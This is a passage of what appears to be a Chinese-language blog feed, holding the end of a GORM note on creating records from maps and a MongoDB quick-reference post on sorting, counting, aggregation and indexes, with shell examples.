class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DB.Session(&amp;gorm.Session&#123;SkipHooks: <span class="literal">true</span>&#125;).Create(&amp;user)</span><br><span class="line">DB.Session(&amp;gorm.Session&#123;SkipHooks: <span class="literal">true</span>&#125;).Create(&amp;users)</span><br><span class="line">DB.Session(&amp;gorm.Session&#123;SkipHooks: <span class="literal">true</span>&#125;).CreateInBatches(&amp;user, <span class="number">100</span>)</span><br></pre></td></tr></table></figure><h4 id="根据-Map-创建"><a href="#根据-Map-创建" class="headerlink" title="根据 Map 创建"></a>根据 Map 创建</h4><p>GORM支持通过<code>map[string]interface&#123;&#125;</code>与<code>[]map[string]interface&#123;&#125;&#123;&#125;</code>来创建记录。</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">db.Model(&amp;User&#123;&#125;).Create(<span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">interface</span>&#123;</span><br><span class="line">    &#123; <span class="string">&quot;Name&quot;</span>: <span class="string">&quot;jinzhu&quot;</span>, <span class="string">&quot;Age&quot;</span>: <span class="number">18</span> &#125;,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// batch insert from `[]map[string]interface&#123;&#125;&#123;&#125;`</span></span><br><span class="line">db.Model(&amp;User).Create([]<span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">interface</span>&#123;&#125;&#123;</span><br><span class="line">    &#123; <span class="string">&quot;Name&quot;</span>: <span class="string">&quot;jinzhu_1&quot;</span>, <span class="string">&quot;Age&quot;</span>: <span class="number">18</span> &#125;,</span><br><span class="line">    &#123; <span class="string">&quot;Name&quot;</span>: <span class="string">&quot;jinzhu_2&quot;</span>, <span class="string">&quot;Age&quot;</span>: <span class="number">20</span> &#125;,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><div class="note bug"><p><strong></strong></p><p><strong>注意:</strong> 当使用map来创建时, 钩子方法不会执行, 关联不会被保存且不会回写主键。</p></div>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDB速记</title>
      <link href="/8ead567e.html"/>
      <url>/8ead567e.html</url>
      
        <content type="html"><![CDATA[<div class="note info"><p><strong></strong></p><p>记录MongoDB相关命令</p></div><span id="more"></span><h2 id="MongoDB-排序"><a href="#MongoDB-排序" class="headerlink" title="MongoDB 排序"></a>MongoDB 排序</h2><h3 id="升序"><a href="#升序" class="headerlink" title="升序"></a>升序</h3><ul><li><p>查询one集合中的数据并根据age字段进行升序排序</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查询one集合中的数据并根据age字段进行升序排序</span></span><br><span class="line"><span class="title class_">Martin</span>&gt; db.<span class="property">one</span>.<span class="title function_">find</span>().<span class="title function_">sort</span>(&#123;<span class="string">&quot;age&quot;</span>: <span class="number">1</span>&#125;)</span><br><span class="line">[</span><br><span class="line">  &#123; <span class="attr">_id</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;666862463ebdc4e4a4cdcdf6&#x27;</span>), <span class="attr">name</span>: <span class="string">&#x27;li&#x27;</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">_id</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;666862763ebdc4e4a4cdcdf7&#x27;</span>), <span class="attr">name</span>: <span class="string">&#x27;zeng&#x27;</span>, <span class="attr">age</span>: <span class="number">16</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">_id</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;6668627f3ebdc4e4a4cdcdf8&#x27;</span>), <span class="attr">name</span>: <span class="string">&#x27;wang&#x27;</span>, <span class="attr">age</span>: <span class="number">20</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">_id</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;6668628a3ebdc4e4a4cdcdf9&#x27;</span>), <span class="attr">name</span>: <span class="string">&#x27;zhang&#x27;</span>, <span class="attr">age</span>: <span class="number">24</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">_id</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;666862943ebdc4e4a4cdcdfa&#x27;</span>), <span class="attr">name</span>: <span class="string">&#x27;li&#x27;</span>, <span class="attr">age</span>: <span class="number">28</span> &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li><li><p>查询one集合中age大于20并根据age进行升序排序</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查询one集合中age大于20并根据age进行升序排序</span></span><br><span class="line"><span class="title class_">Martin</span>&gt; db.<span class="property">one</span>.<span class="title function_">find</span>(&#123;<span class="attr">age</span>: &#123;<span class="attr">$gt</span>: <span class="number">20</span>&#125;&#125;).<span class="title function_">sort</span>(&#123;<span class="string">&quot;age&quot;</span>: <span class="number">1</span>&#125;)</span><br><span class="line">[</span><br><span class="line">  &#123; <span class="attr">_id</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;6668628a3ebdc4e4a4cdcdf9&#x27;</span>), <span class="attr">name</span>: <span class="string">&#x27;zhang&#x27;</span>, <span class="attr">age</span>: <span class="number">24</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">_id</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;666862943ebdc4e4a4cdcdfa&#x27;</span>), <span class="attr">name</span>: <span class="string">&#x27;li&#x27;</span>, <span class="attr">age</span>: <span class="number">28</span> &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li></ul><h3 id="降序"><a href="#降序" class="headerlink" title="降序"></a>降序</h3><ul><li><p>查询one集合中的数据并根据age字段进行降序排序</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查询one集合中的数据并根据age字段进行降序排序</span></span><br><span class="line"><span class="title class_">Martin</span>&gt; db.<span class="property">one</span>.<span class="title function_">find</span>().<span class="title function_">sort</span>(&#123;<span class="string">&quot;age&quot;</span>: -<span class="number">1</span>&#125;)</span><br><span class="line">[</span><br><span class="line">  &#123; <span class="attr">_id</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;666862943ebdc4e4a4cdcdfa&#x27;</span>), <span class="attr">name</span>: <span class="string">&#x27;li&#x27;</span>, <span class="attr">age</span>: <span class="number">28</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">_id</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;6668628a3ebdc4e4a4cdcdf9&#x27;</span>), <span class="attr">name</span>: <span class="string">&#x27;zhang&#x27;</span>, <span class="attr">age</span>: <span class="number">24</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">_id</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;6668627f3ebdc4e4a4cdcdf8&#x27;</span>), <span class="attr">name</span>: <span class="string">&#x27;wang&#x27;</span>, <span class="attr">age</span>: <span class="number">20</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">_id</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;666862763ebdc4e4a4cdcdf7&#x27;</span>), <span class="attr">name</span>: <span class="string">&#x27;zeng&#x27;</span>, <span class="attr">age</span>: <span class="number">16</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">_id</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;666862463ebdc4e4a4cdcdf6&#x27;</span>), <span class="attr">name</span>: <span class="string">&#x27;li&#x27;</span> &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li><li><p>查询one集合中age大于20并根据age进行降序排序</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查询one集合中age大于20并根据age进行降序排序</span></span><br><span class="line"><span class="title class_">Martin</span>&gt; db.<span class="property">one</span>.<span class="title function_">find</span>(&#123;<span class="attr">age</span>: &#123;<span class="attr">$gt</span>: <span class="number">20</span>&#125;&#125;).<span class="title function_">sort</span>(&#123;<span class="string">&quot;age&quot;</span>: -<span class="number">1</span>&#125;)</span><br><span class="line">[</span><br><span class="line">  &#123; <span class="attr">_id</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;666862943ebdc4e4a4cdcdfa&#x27;</span>), <span class="attr">name</span>: <span class="string">&#x27;li&#x27;</span>, <span class="attr">age</span>: <span class="number">28</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">_id</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;6668628a3ebdc4e4a4cdcdf9&#x27;</span>), <span class="attr">name</span>: <span class="string">&#x27;zhang&#x27;</span>, <span class="attr">age</span>: <span class="number">24</span> &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li></ul><h2 id="求和"><a href="#求和" class="headerlink" title="求和"></a>求和</h2><h3 id="求集合的文档总数"><a href="#求集合的文档总数" class="headerlink" title="求集合的文档总数"></a>求集合的文档总数</h3><ul><li><p>查询one集合中的文档总数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查询one集合中的文档总数</span></span><br><span class="line"><span class="title class_">Martin</span>&gt; db.<span class="property">one</span>.<span class="title function_">countDocuments</span>()</span><br><span class="line"><span class="number">5</span></span><br></pre></td></tr></table></figure></li><li><p>查询one集合中age大于20的文档数量</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查询one集合中age大于20的文档数量</span></span><br><span class="line"><span class="title class_">Martin</span>&gt; db.<span class="property">one</span>.<span class="title function_">find</span>(&#123;<span class="attr">age</span>: &#123;<span class="attr">$gt</span>: <span class="number">20</span>&#125;&#125;).<span class="title function_">count</span>()</span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="某个字段求和"><a href="#某个字段求和" class="headerlink" title="某个字段求和"></a>某个字段求和</h3><blockquote><p>导入测试数据</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 导入测试数据</span></span><br><span class="line"><span class="title class_">Martin</span>&gt; db.<span class="property">three</span>.<span class="title function_">insertMany</span>(<span class="params">[&#123;name: <span class="string">&quot;li&quot;</span>, <span class="keyword">class</span>: <span class="number">1</span>, score: <span class="number">89</span>&#125;, &#123;name: <span class="string">&quot;zhang&quot;</span>, <span class="keyword">class</span>: <span class="number">1</span>, score: <span class="number">92</span>&#125;, &#123;name: <span class="string">&quot;li&quot;</span>, <span class="keyword">class</span>: <span class="number">2</span>, score: <span class="number">94</span>&#125;, &#123;name: <span class="string">&quot;liu&quot;</span>, <span class="keyword">class</span>: <span class="number">2</span>, score: <span class="number">88</span>&#125;]</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">acknowledged</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">insertedIds</span>: &#123;</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;666866c33ebdc4e4a4cdcdfb&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;666866c33ebdc4e4a4cdcdfc&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;2&#x27;</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;666866c33ebdc4e4a4cdcdfd&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;3&#x27;</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;666866c33ebdc4e4a4cdcdfe&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 查询three集合中所有数据</span></span><br><span class="line"><span class="title class_">Martin</span>&gt; db.<span class="property">three</span>.<span class="title function_">find</span>()</span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">_id</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;666866c33ebdc4e4a4cdcdfb&#x27;</span>),</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;li&#x27;</span>,</span><br><span class="line">    <span class="attr">class</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">score</span>: <span class="number">89</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">_id</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;666866c33ebdc4e4a4cdcdfc&#x27;</span>),</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;zhang&#x27;</span>,</span><br><span class="line">    <span class="attr">class</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">score</span>: <span class="number">92</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">_id</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;666866c33ebdc4e4a4cdcdfd&#x27;</span>),</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;li&#x27;</span>,</span><br><span class="line">    <span class="attr">class</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="attr">score</span>: <span class="number">94</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">_id</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;666866c33ebdc4e4a4cdcdfe&#x27;</span>),</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;liu&#x27;</span>,</span><br><span class="line">    <span class="attr">class</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="attr">score</span>: <span class="number">88</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><ul><li>对不同class进行score求和<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Martin</span>&gt; db.<span class="property">three</span>.<span class="title function_">aggregate</span>([&#123;<span class="string">&#x27;$group&#x27;</span>: &#123;<span class="string">&#x27;_id&#x27;</span>: <span class="string">&#x27;$class&#x27;</span>, <span class="string">&#x27;sum_score&#x27;</span>: &#123;<span class="string">&#x27;$sum&#x27;</span>: <span class="string">&#x27;$score&#x27;</span>&#125;&#125;&#125;])</span><br><span class="line">[ </span><br><span class="line">    &#123; <span class="attr">_id</span>: <span class="number">1</span>, <span class="attr">sum_score</span>: <span class="number">181</span> &#125;, </span><br><span class="line">    &#123; <span class="attr">_id</span>: <span class="number">2</span>, <span class="attr">sum_score</span>: <span class="number">182</span> &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li></ul><h2 id="平均"><a href="#平均" class="headerlink" title="平均"></a>平均</h2><div class="note info"><p><strong>aggregate()用法解释</strong></p><p>示例: <code>db.collection_name.aggregate([{&#39;$group&#39;: {&#39;_id&#39;: &#39;$group_filed&#39;, &#39;avg_xxx&#39;: {&#39;$avg&#39;: &#39;$avg_filed&#39;}}}])</code></p><ul><li><code>$group</code>: 分组;</li><li><code>_id</code>: 分组后的标识;</li><li><code>$group_filed</code>: 分组的字段;</li><li><code>avg_xxx</code>: 聚合之后的字段名;</li><li><code>$avg</code>: 表示求平均值, <code>$sum</code>表示求和, <code>$max</code>: 表示求最大值, <code>$min</code>: 表示求最小值;</li><li><code>$avg_filed</code>: 要聚合的字段;</li></ul></div><ul><li><p>求平均值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 根据班级求各班的平均值</span></span><br><span class="line"><span class="title class_">Martin</span>&gt; db.<span class="property">three</span>.<span class="title function_">aggregate</span>([&#123;<span class="string">&#x27;$group&#x27;</span>: &#123;<span class="string">&#x27;_id&#x27;</span>: <span class="string">&#x27;$class&#x27;</span>, <span class="attr">avg_score</span>: &#123;<span class="string">&#x27;$avg&#x27;</span>: <span class="string">&#x27;$score&#x27;</span>&#125;&#125;&#125;])</span><br><span class="line">[ </span><br><span class="line">    &#123; <span class="attr">_id</span>: <span class="number">2</span>, <span class="attr">avg_score</span>: <span class="number">91</span> &#125;, </span><br><span class="line">    &#123; <span class="attr">_id</span>: <span class="number">1</span>, <span class="attr">avg_score</span>: <span class="number">90.5</span> &#125; </span><br><span class="line">]</span><br></pre></td></tr></table></figure></li><li><p>求分组最大值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 求分组最大值</span></span><br><span class="line"><span class="title class_">Martin</span>&gt; db.<span class="property">three</span>.<span class="title function_">aggregate</span>([&#123;<span class="string">&#x27;$group&#x27;</span>: &#123;<span class="attr">_id</span>: <span class="string">&#x27;$class&#x27;</span>, <span class="string">&#x27;max_score&#x27;</span>: &#123;<span class="string">&#x27;$max&#x27;</span>: <span class="string">&#x27;$score&#x27;</span>&#125;&#125;&#125;])</span><br><span class="line">[ </span><br><span class="line">    &#123; <span class="attr">_id</span>: <span class="number">1</span>, <span class="attr">max_score</span>: <span class="number">92</span> &#125;, </span><br><span class="line">    &#123; <span class="attr">_id</span>: <span class="number">2</span>, <span class="attr">max_score</span>: <span class="number">94</span> &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li><li><p>求分组最小值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 求分组最小值</span></span><br><span class="line"><span class="title class_">Martin</span>&gt; db.<span class="property">three</span>.<span class="title function_">aggregate</span>([&#123;<span class="string">&#x27;$group&#x27;</span>: &#123;<span class="attr">_id</span>: <span class="string">&#x27;$class&#x27;</span>, <span class="string">&#x27;min_score&#x27;</span>: &#123;<span class="string">&#x27;$min&#x27;</span>: <span class="string">&#x27;$score&#x27;</span>&#125;&#125;&#125;])</span><br><span class="line">[ </span><br><span class="line">    &#123; <span class="attr">_id</span>: <span class="number">1</span>, <span class="attr">min_score</span>: <span class="number">89</span> &#125;, </span><br><span class="line">    &#123; <span class="attr">_id</span>: <span class="number">2</span>, <span class="attr">min_score</span>: <span class="number">88</span> &#125; </span><br><span class="line">]</span><br></pre></td></tr></table></figure></li></ul><h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><blockquote><p>提高检索的速度</p></blockquote><h3 id="单键索引"><a href="#单键索引" class="headerlink" title="单键索引"></a>单键索引</h3><ul><li><p>添加测试数据</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用for循环添加数据</span></span><br><span class="line"><span class="title class_">Martin</span>&gt; <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">1</span>; i&lt;=<span class="number">10000</span>; i++) db.<span class="property">four</span>.<span class="title function_">insert</span>(&#123;<span class="attr">num</span>: i, <span class="attr">name</span>: <span class="string">&#x27;a&#x27;</span>&#125;)</span><br><span class="line"><span class="title class_">DeprecationWarning</span>: <span class="title class_">Collection</span>.<span class="title function_">insert</span>() is deprecated. <span class="title class_">Use</span> insertOne, insertMany, or bulkWrite.</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">acknowledged</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">insertedIds</span>: &#123; <span class="string">&#x27;0&#x27;</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;666d8638f6e0bc9a3ecdf505&#x27;</span>) &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Martin</span>&gt; db.<span class="property">four</span>.<span class="title function_">find</span>()</span><br><span class="line">[</span><br><span class="line">  &#123; <span class="attr">_id</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;666d862af6e0bc9a3ecdcdf6&#x27;</span>), <span class="attr">num</span>: <span class="number">1</span>, <span class="attr">name</span>: <span class="string">&#x27;a&#x27;</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">_id</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;666d862af6e0bc9a3ecdcdf7&#x27;</span>), <span class="attr">num</span>: <span class="number">2</span>, <span class="attr">name</span>: <span class="string">&#x27;a&#x27;</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">_id</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;666d862af6e0bc9a3ecdcdf8&#x27;</span>), <span class="attr">num</span>: <span class="number">3</span>, <span class="attr">name</span>: <span class="string">&#x27;a&#x27;</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">_id</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;666d862af6e0bc9a3ecdcdf9&#x27;</span>), <span class="attr">num</span>: <span class="number">4</span>, <span class="attr">name</span>: <span class="string">&#x27;a&#x27;</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">_id</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;666d862af6e0bc9a3ecdcdfa&#x27;</span>), <span class="attr">num</span>: <span class="number">5</span>, <span class="attr">name</span>: <span class="string">&#x27;a&#x27;</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">_id</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;666d862af6e0bc9a3ecdcdfb&#x27;</span>), <span class="attr">num</span>: <span class="number">6</span>, <span class="attr">name</span>: <span class="string">&#x27;a&#x27;</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">_id</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;666d862af6e0bc9a3ecdcdfc&#x27;</span>), <span class="attr">num</span>: <span class="number">7</span>, <span class="attr">name</span>: <span class="string">&#x27;a&#x27;</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">_id</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;666d862af6e0bc9a3ecdcdfd&#x27;</span>), <span class="attr">num</span>: <span class="number">8</span>, <span class="attr">name</span>: <span class="string">&#x27;a&#x27;</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">_id</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;666d862af6e0bc9a3ecdcdfe&#x27;</span>), <span class="attr">num</span>: <span class="number">9</span>, <span class="attr">name</span>: <span class="string">&#x27;a&#x27;</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">_id</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;666d862af6e0bc9a3ecdcdff&#x27;</span>), <span class="attr">num</span>: <span class="number">10</span>, <span class="attr">name</span>: <span class="string">&#x27;a&#x27;</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">_id</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;666d862af6e0bc9a3ecdce00&#x27;</span>), <span class="attr">num</span>: <span class="number">11</span>, <span class="attr">name</span>: <span class="string">&#x27;a&#x27;</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">_id</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;666d862af6e0bc9a3ecdce01&#x27;</span>), <span class="attr">num</span>: <span class="number">12</span>, <span class="attr">name</span>: <span class="string">&#x27;a&#x27;</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">_id</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;666d862af6e0bc9a3ecdce02&#x27;</span>), <span class="attr">num</span>: <span class="number">13</span>, <span class="attr">name</span>: <span class="string">&#x27;a&#x27;</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">_id</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;666d862af6e0bc9a3ecdce03&#x27;</span>), <span class="attr">num</span>: <span class="number">14</span>, <span class="attr">name</span>: <span class="string">&#x27;a&#x27;</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">_id</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;666d862af6e0bc9a3ecdce04&#x27;</span>), <span class="attr">num</span>: <span class="number">15</span>, <span class="attr">name</span>: <span class="string">&#x27;a&#x27;</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">_id</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;666d862af6e0bc9a3ecdce05&#x27;</span>), <span class="attr">num</span>: <span class="number">16</span>, <span class="attr">name</span>: <span class="string">&#x27;a&#x27;</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">_id</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;666d862af6e0bc9a3ecdce06&#x27;</span>), <span class="attr">num</span>: <span class="number">17</span>, <span class="attr">name</span>: <span class="string">&#x27;a&#x27;</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">_id</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;666d862af6e0bc9a3ecdce07&#x27;</span>), <span class="attr">num</span>: <span class="number">18</span>, <span class="attr">name</span>: <span class="string">&#x27;a&#x27;</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">_id</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;666d862af6e0bc9a3ecdce08&#x27;</span>), <span class="attr">num</span>: <span class="number">19</span>, <span class="attr">name</span>: <span class="string">&#x27;a&#x27;</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">_id</span>: <span class="title class_">ObjectId</span>(<span class="string">&#x27;666d862af6e0bc9a3ecdce09&#x27;</span>), <span class="attr">num</span>: <span class="number">20</span>, <span class="attr">name</span>: <span class="string">&#x27;a&#x27;</span> &#125;</span><br><span class="line">]</span><br><span class="line"><span class="title class_">Type</span> <span class="string">&quot;it&quot;</span> <span class="keyword">for</span> more</span><br></pre></td></tr></table></figure></li><li><p>创建索引</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建索引, 1为升序索引, -1为降序索引</span></span><br><span class="line"><span class="title class_">Martin</span>&gt; db.<span class="property">four</span>.<span class="title function_">createIndex</span>(&#123;<span class="string">&quot;num&quot;</span>: <span class="number">1</span>&#125;)</span><br><span class="line">num_1</span><br></pre></td></tr></table></figure></li><li><p>查询索引</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查询索引</span></span><br><span class="line"><span class="title class_">Martin</span>&gt; db.<span class="property">four</span>.<span class="title function_">getIndexes</span>()</span><br><span class="line">[</span><br><span class="line">  &#123; <span class="attr">v</span>: <span class="number">2</span>, <span class="attr">key</span>: &#123; <span class="attr">_id</span>: <span class="number">1</span> &#125;, <span class="attr">name</span>: <span class="string">&#x27;_id_&#x27;</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">v</span>: <span class="number">2</span>, <span class="attr">key</span>: &#123; <span class="attr">num</span>: <span class="number">1</span> &#125;, <span class="attr">name</span>: <span class="string">&#x27;num_1&#x27;</span> &#125;</span><br><span 